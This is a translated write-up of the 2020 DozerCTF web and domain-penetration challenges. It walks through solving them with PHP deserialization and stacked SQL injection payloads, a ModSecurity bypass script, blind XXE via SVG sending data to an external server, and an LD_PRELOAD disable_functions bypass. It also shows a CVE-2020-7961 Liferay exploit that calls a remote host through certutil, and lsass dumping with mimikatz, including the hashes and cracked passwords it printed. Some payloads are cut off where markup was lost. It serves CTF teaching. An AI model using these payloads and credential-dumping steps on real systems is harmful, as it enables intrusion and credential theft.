# 2020 DozerCTF write UP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Web
###  白给的反序列化
**题目描述**
不能再简单了，再简单自杀，flag在flag.php里面
**出题思路**
最简单的反序列化，你会发现几乎所有的限制其实都不生效，只是为了增加一点阅读代码的乐趣
**解题思路**
根据提示只需要执行`cat flag.php`就行了
读完代码，你会发现，其实真正的限制只有这个
    if (in_array($this->method, array("mysys"))) {
                call_user_func_array(array($this, $this->method), $this->args);
            }
method变量为`mysys`就行
args变量的限制其实不生效，因为`__destruct()`，所以无论前面有没有`die()`最终`__destruct()`都会被调用，只要注意下`call_user_func_array`传入的第二个参数`$this->args`要是数组就行，可以任意命令执行。
exp：
    method = $method;
            $this->args = $args;
        }
        function __destruct()
        {
            if (in_array($this->method, array("mysys"))) {
                call_user_func_array(array($this, $this->method), $this->args);
            }
        }
    }
    $a = new home('mysys',array('flag.php'));
    echo urlencode(serialize($a));
    ?>
生成如下payload
    O%3A4%3A"home"%3A2%3A%7Bs%3A12%3A"%00home%00method"%3Bs%3A5%3A"mysys"%3Bs%3A10%3A"%00home%00args"%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A"flag.php"%3B%7D%7D
###  sqli-labs 0
**题目描述**
不会吧，不会真有人不会注入吧
**出题思路**
网鼎杯“随便注”基础上加了转义，所以需要二次编码绕过，加入了过滤`rename、alter、union'`
**解题思路**
通过传入参数添加二次编码的单引号`%2527`,发现报错，但是因为过滤union用不了，所以想到堆叠注入。
    1%2527;show databases;%2523  查库名
    1%2527;use security;show tables;%2523 查表名
    1%2527;use security;show columns from uziuzi;%2523 查列名
最后查看flag，`select`被过滤了，可以预处理语句或者handler查询
handler查询
    1%2527;handler uziuzi open as hhh;handler hhh read first;%2523
预处理
    id=1%2527;sEt%2520@sql=concat(%2522sel%2522,%2522ect%2520flag%2520from%2520%2560 uziuzi%2560%2522);prepare%2520mysql%2520from%2520@sql;execute%2520mysql;
###  svgggggg！
**题目描述**
只求大佬门不要搅屎,求放过…
**出题思路**
解析svg未严格限制格式，造成blind xxe，ssrf打内网服务
**解题方法**
首先需要一台公网服务器，或者将本地服务转发到公网ip才能解题
先构造xxe.svg和xxe.xml
xxe.svg如下，重点在构造上半段，网上找blind xxe的payload也是可以的
    %sp;
    %param1;
    ]>
          XXE via SVG rasterization
                &exfil;
xxe.xml如下
    ">
我是用了github上的开源项目[xxeser](https://github.com/staaldraad/xxeserv)搭建在服务器上来比较便利的获取到Blind
XXE返回的内容。接下来以xxeser为例，当然你也可以用自己的方法
将xxe.svg和xxe.xml移动到xxeser文件下自己创建的xxe-svg-xml文件夹下，并在我的服务器上开启了该服务
    ./xxeserv -w -wd ./xxe-svg-xml
只需要通过修改xxe.xml，再访问[http://118.31.11.216:30500/view.php?svg=http://218.78.20.xxx:2122/xxe.svg，就可以获取到想要的内容，然后就可以开始Blind](http://118.31.11.216:30500/view.php?svg=http://218.78.20.xxx:2122/xxe.svg%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E6%83%B3%E8%A6%81%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BC%80%E5%A7%8BBlind)
XXE之旅了
index.php和view.php都有`made with by r1ck`
读取r1ck的.bash_history
    ">
发现/app目录下起了php服务在0.0.0.0:8080
首先读取/app/index.php的源码，发现存在sql注入
    ">
利用sql注入通过如下语句在/app目录下写入命令执行语句，这边写入shell语句注意编码url编码，hex编码都可以
url编码：
    ">
hex编码：
    ">
通过刚刚写入的文件命令执行，`ls`查看当前目录下文件，可以看到flag文件，再用相同的方法`cat`查看flag文件就行
    ">
###  babay waf
**题目描述**
刚搭了个开源的waf-modsecurity,这样师傅们应该就没办法了吧(狗头).
**出题思路**
本题是实战中遇到的一个环境,本地还原了一下.主要还是在套娃,没什么新姿势.
**解题过程**
拿到题目很显然题目是joomla cms,想办法查看版本,可以通过默认安装的语言包获得.
访问/language/en-GB/en-GB.xml获取到版本为2.5.28和hint
hint为hashcat的掩码,结合另一个hint编辑器可以找到漏洞sql注入漏洞[Joomla Component JCK Editor 6.4.4 –
‘parent’ SQL Injection](https://www.exploit-db.com/exploits/45423).
但是由于modsecurity存在,payload会被拦截.
找到[modsecurity sql注入 bypass 的方法](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1167),构造出盲注的payload:
    a" or {`if`(left((select username from fqf89_users limit 0,1),1)='a')} -- -    
简单盲注跑一下
    import requests
    url="http://web12138.dozerjit.club:8086/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="
    length=len(requests.get(url+"a" or {`if`(1=1)} -- -").text)
    ret=""
    for i in range(1,40):
        for j in range(20,128):
            payload="a" or {`if`(ascii(substr((select password from fqf89_users limit 0,1),%s,1))=%d)} -- -"%(i,j)
            r=requests.get(url+payload)
            #print  payload
            if len(r.text)==length:
                ret=ret+str(chr(j))
                print ret
在有其他用户注册的情况下,还有师傅用报错得到了hash…
不是很明白users表只有一条数据的时候为什么不行..机缘巧合之下题目难度被降低了…
    1 " and{`if`updatexml(1,concat(0x3a,(select /*!50000(((password))) from/*!50000fqf89_users*/ limit 1,1)),1)}#
对hash进行破解:
    hashcat.exe -a 3 -m 400 '$P$DTCPSnZSPuO1eZWjIqKm0CZFe8/GgY0' ?u?d?a?d?a?
得到明文密码D0z3r,进入后台通过上传语言包getshell.
一般的一句话木马流量特征会被检测到,使用冰蝎即可绕过流量检测.发现开启了disable_functions,使用ld_preload绕过即可执行搜索命令.
    #include
    #include
    #include
    void payload(){
    system("grep -nR "Dozerctf" /var/www/html > /var/www/html/language/result.txt");
    } 
    int geteuid(){
    if(getenv("LD_PRELOAD") ==NULL) {
    return 0;}
    unsetenv("LD_PRELOAD");
    payload();
    }
编译
    root@ubuntu:~# gcc -c -fPIC a.c -o a
    root@ubuntu:~# gcc -shared a -o a.so
编写php:
上传并执行,获取flag:
    /var/www/html/modules/mod_finder/helper.php:90:/*Dozerctf{da6776e7ec7eaa7a6f3df5c6b149127em}*/
    Binary file /var/www/html/a.so matches
###  简单域渗透
**题目描述**
都是最基础redteam技能…大佬门不要搅屎,求放过…
**出题思路**
想出个简单的域环境,尽量多的涵盖一些redteam技能,要陪女朋友(其实就是懒),所以就只出了三个机器,知识点也不是很多.
很多东西没涉及到,如简单的横向移动(wmic,schtasks,winrs等),个人机上的一些信息的获取(firefox,chrome凭证,windows凭据管理器等),本地提权(juicy
photo,exp),域提权(gpp,14068,ntlm relaty等)等等等等.
杀软随便找了个360(主要是免费),直接给了师傅们本机管理员等等都降低了难度,和实战的环境相差比较多.
环境会由学弟打包共享给大家,大家可以进一步充实这个环境.
比较推荐的红队wiki:ired.team
**解题过程**
外网是一个liferay,结合之前的cve-2020-7961可以直接rce.这里环境没有为难大家,直接是可以出网的机器,可以直接使用certutil下载荷载或者webshell进行内网渗透,否则还需要构造不出网的exp.
出网的exp可以直接使用[CVE-2020-7961](https://github.com/b33p-b0x/CVE-2020-7961-payloads)
先将.java编译成字节码.class:
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    public class LifExp {
    static {
    try {
                String[] cmd = {"cmd.exe", "/c", "whoami"};
                Process process=java.lang.Runtime.getRuntime().exec(cmd);
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String s= stdInput.readLine();
                String[] cmd2 = {"cmd.exe", "/c", "certutil.exe -urlcache -split -f http://vps/"+s+""};
                java.lang.Runtime.getRuntime().exec(cmd2);
            } catch ( Exception e ) {
                e.printStackTrace();
            }
    }
    }
编译:
    javac LifExp.java
启动脚本:
    python poc.py -t http://web1616.dozerjit.club:8086 -l vps -p 8080
这里有坑,vps地址不能填0.0.0.0,这里的地址有两个作用.一是作为vps
webserver的监听的地址,二是会被写进payload,作为目标请求远程payload的地址.
将poc中webserver监听相关的注释,-l 为vps公网地址.手动启动SimpleHTTPServer 监听0.0.0.0.
(手动构造反序列化payload的师傅不会遇到这些问题)
确认漏洞存在后,使用cs或msf等工具生成的exe会被杀,确认一下杀软:
    tasklist /svc
    dir c:progra~1
    dir c:progra~2
发现是360,师傅们可以选择c2的荷载免杀来绕过,这里我们进行曲线救国,不使用c2进行内网渗透.找个目录放websll即可.
(有些师傅powershell能弹shell之后又不行了是360的问题)
在桌面上找到第一个flag:
    Dozerctf{a993e8ce377e05b2cbfa460e43e43757}
进行简单的域内信息搜集,列出域信任关系
    nltest /domain_trusts
环境为单域,查看ip信息,一般dns服务器就是dc:
    ipconfig /all
获得当前机器的hash:
    reg save hklmsam sam
    reg save hklmsystem system
    mimikatz # lsadump::sam /sam:sam /system:system
    Domain : DOZER-DMZ01
    SysKey : f443141fcbd9a35c64370d36a05f8e70
    Local SID : S-1-5-21-1495210691-4001662545-2502461571
    SAMKey : 5f0f962fafd8bc2a549097e62597e6bc
    RID  : 000001f4 (500)
    User : Administrator
      Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
    RID  : 000001f5 (501)
    User : Guest
    RID  : 000003e9 (1001)
    User : root
      Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
        lm  - 0: 4364da8b9c9e89eff083dc130b360e4b
        ntlm- 0: e19ccf75ee54e06b06a5907af13cef42
        ntlm- 1: 1aface37f4f4843d3f534c73716b9a7e
得到本地管理员hash,破解明文为P[@ssw0rd](https://github.com/ssw0rd
"@ssw0rd"),查看c盘用户目录发现最近有shark用户登陆过,可以通过systeminfo的启动时间和目录修改时间进行对比,一般目录修改时间晚于重启时间才能在内存里抓到这个用户.
(因为有hxd搅屎的缘故,机器重启了,忘记登陆了,中间内存出了点问题,shark的hash有一段时间是错的)
转储内存抓域凭证:
    procdump64.exe -ma -accepteula lsass.exe 1.dmp 或者 rundll32.exe C:windowsSystem32comsvcs.dll, MiniDump 560 C:programdata1.dmp full
    mimikatz # sekurlsa::minidump lass.dmp
    Switch to MINIDUMP : 'lass.dmp'
    mimikatz # sekurlsa::logonpasswords
获取到了一个域用户shark的密码,依然是P[@ssw0rd](https://github.com/ssw0rd "@ssw0rd").
其实就算不抓内存有经验的师傅也会想到用本机密码试一试,如何试比较简单的方式就是连一下自己的共享
    net use \127.0.0.1 /user:dozershark "P@ssw0rd"
接下来就是域内信息搜集,使用dsquery去导出域信息.
    dsquery * /s 10.10.10.3 /u shark /p P@ssw0rd -attr * -limit 0 > 1.txt
域信息是ldap结构的,dsquery导出的其实和net user /domain 等命令执行是一样的.
在用户信息里搜索到第二个flag:
    cn: flagflag
    sn: flag
    distinguishedName: CN=flagflag,CN=Users,DC=dozer,DC=org
    instanceType: 4
    whenCreated: 05/16/2020 17:35:13
    whenChanged: 05/16/2020 17:37:11
    displayName: flag
    uSNCreated: 38671